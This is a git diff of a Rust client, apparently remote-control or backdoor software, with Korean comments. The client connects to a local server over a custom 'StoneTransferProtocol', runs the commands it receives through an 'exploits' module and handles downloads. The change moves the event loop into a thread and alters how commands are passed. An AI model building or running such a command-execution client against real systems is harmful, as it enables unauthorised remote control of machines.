@@ -1,18 +1,22 @@
-mod exploit;
+mod exploits;
 mod stprotocol;
 mod structure;
 
 use bstr::ByteSlice;
-use exploit::{Exploits, Malware};
-use std::io::{Read, Write};
+use exploits::{Exploits, Malware};
+use std::{io::Read, io::Write, thread};
 use stprotocol::{Client, Session};
 use structure::{Detector, Generator, StoneTransferProtocol, StructStone};
 
 fn main() {
-    event_loop(
-        Session::new("127.0.0.1:6974".to_string()),
-        StructStone::default(),
-    )
+    let client_handler = thread::spawn(|| {
+        event_loop(
+            Session::new("127.0.0.1:6974".to_string()),
+            StructStone::default(),
+        )
+    });
+
+    client_handler.join().unwrap();
 }
 
 fn event_loop(mut client: Session, mut packet: StructStone) {
@@ -29,8 +33,7 @@ fn event_loop(mut client: Session, mut packet: StructStone) {
             // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
             StoneTransferProtocol::ExecuteCmd => {
                 // 타입이 ExecuteCmd 일 경우
-                exploit.exploit_input = packet.get_command();
-                client.exploit(exploit.execute());
+                client.exploit(exploit.command(packet));
             }
             StoneTransferProtocol::Download => {
                 // 타입이 Download 일 경우
